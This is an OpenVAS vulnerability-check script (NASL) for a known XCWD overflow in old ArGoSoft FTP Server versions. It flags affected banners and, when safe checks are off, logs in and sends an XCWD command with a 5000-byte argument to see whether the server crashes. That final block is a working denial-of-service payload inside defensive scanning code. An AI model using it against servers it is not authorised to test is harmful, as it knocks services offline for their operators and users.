# OpenVAS Vulnerability Test
# $Id: argosoft_server_xcmd.nasl 13613 2019-02-12 16:12:57Z cfischer $
# Description: ArGoSoft FTP Server XCWD Overflow
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

#  Ref: Moran Zavdi <moran@moozatech.com>

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15439");
  script_version("$Revision: 13613 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-12 17:12:57 +0100 (Tue, 12 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(8704);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("ArGoSoft FTP Server XCWD Overflow");
  script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_family("Denial of Service");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/argosoft/ftp/detected");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to 1.4.1.2 or newer.");

  script_tag(name:"summary", value:"The remote host is running the ArGoSoft FTP server.

  It was possible to shut down the remote FTP server by issuing
  a XCWD command followed by a too long argument.");

  script_tag(name:"impact", value:"This problem allows an attacker to prevent the remote site i
  from sharing some resources with the rest of the world.");

  exit(0);
}

include("ftp_func.inc");

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
password = kb_creds["pass"];

port = get_ftp_port(default:21);
banner = get_ftp_banner(port: port);
if(! banner || "ArGoSoft FTP Server" >!< banner)
  exit(0);

if (safe_checks() || ! login)
{
  #220 ArGoSoft FTP Server for Windows NT/2000/XP, Version 1.4 (1.4.1.1)
  if (egrep(pattern:".*ArGoSoft FTP Server .* Version .* \((0\.|1\.([0-3]\.|4(\.0|\.1\.[01])))\).*", string:banner) )
    security_message(port);
  exit(0);
}

soc = open_sock_tcp(port);
if(soc)
{
  if(ftp_authenticate(socket:soc, user:login, pass:password))
  {
    s = string("XCWD ", crap(5000), "\r\n");
    send(socket:soc, data:s);
    r = recv_line(socket:soc, length:1024);
    close(soc);

    soc = open_sock_tcp(port);
    if(!soc)
    {
      security_message(port);
      exit(0);
    }
  }
  close(soc);
}